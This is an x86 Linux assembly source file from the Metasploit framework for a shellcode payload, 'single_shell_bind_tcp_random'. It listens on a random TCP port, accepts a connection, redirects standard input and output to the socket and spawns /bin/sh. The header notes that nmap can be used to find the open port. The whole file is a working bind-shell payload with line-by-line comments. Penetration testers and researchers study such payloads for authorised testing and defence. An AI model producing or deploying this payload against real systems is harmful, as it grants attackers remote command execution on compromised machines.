;;
;
; Name: single_shell_bind_tcp_random
; Qualities: None
; Platforms: Linux
; Author: Geyslan G. Bem <geyslan@gmail.com>
; License: BSD 3-Clause
;
; This file is part of the Metasploit Exploit Framework
; and is subject to the same licenses and copyrights as
; the rest of this package.
;
; Description:
;
;  Listen for a connection in a random port and spawn a
;  command shell.
;  Use nmap to discover the open port: 'nmap -sS target -p-'.
;  Repo source: http://goo.gl/V5OObo
;
;;

bits 32

global _start

section .text

_start:
	; Avoiding garbage
	; Putting zero in three registers (eax, ebx and edx), search about mul instruction for understanding

	xor ebx, ebx
	mul ebx

	; syscalls (/usr/include/asm/unistd_32.h)
	; socketcall numbers (/usr/include/linux/net.h)

	; Creating the socket file descriptor
	; int socket(int domain, int type, int protocol);
	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)

	mov al, 102		; syscall 102 - socketcall
	inc ebx			; socketcall type (sys_socket 1)

	; socket arguments (bits/socket.h, netinet/in.h)
	push edx		; IPPROTO_IP = 0 (int)
	push ebx		; SOCK_STREAM = 1 (int)
	push 2			; AF_INET = 2 (int)

	mov ecx, esp		; ptr to argument array

	int 0x80		; kernel interruption


	; Preparing to listen the incoming connection (passive socket)
	; int listen(int sockfd, int backlog);
	; listen(sockfd, int);

	; listen arguments
	push edx		; put zero
	push eax		; put the file descriptor returned by socket()
	mov ecx, esp		; ptr to argument array

	mov al, 102		; syscall 102 - socketcall
	mov bl, 4		; socketcall type (sys_listen 4)

	int 0x80		; kernel interruption


	; Accepting the incoming connection
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	; accept(sockfd, NULL, NULL)

        mov al, 102		; syscall 102 - socketcall
        inc ebx			; socketcall type (sys_accept 5)

	; accept arguments	; here we just don't need do nothing, the ecx already points to sockfd, NULL and 2
				; you ask me: but the correct isn't sockfd, NULL, NULL? Well, 'man accept' to figure out ;D)

	int 0x80		; kernel interruption


	; Creating a interchangeably copy of the 3 file descriptors (stdin, stdout, stderr)
	; int dup2(int oldfd, int newfd);
	; dup2(clientfd, ...)

	pop ecx			; pop the sockfd integer to use as the loop counter ecx
	xchg ebx, eax		; swapping registers values to put the accepted sockfd (client) in ebx as argument in next syscall (dup2)

dup_loop:
	push 63			; syscall 63 - dup2
	pop eax

	int 0x80		; kernel interruption

	dec ecx			; file descriptor and loop counter

	jns dup_loop


	; Finally, using execve to substitute the actual process with /bin/sh
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	; exevcve("/bin/sh", NULL, NULL)

	mov al, 11		; execve syscall

	; execve string argument
	; stack already contains NULL on top
	push 0x68732f2f		; "//sh"
	push 0x6e69622f		; "/bin"

	mov ebx, esp		; ptr to "/bin//sh" string

	inc ecx			; zero to argv
				; zero to envp (edx)

	int 0x80
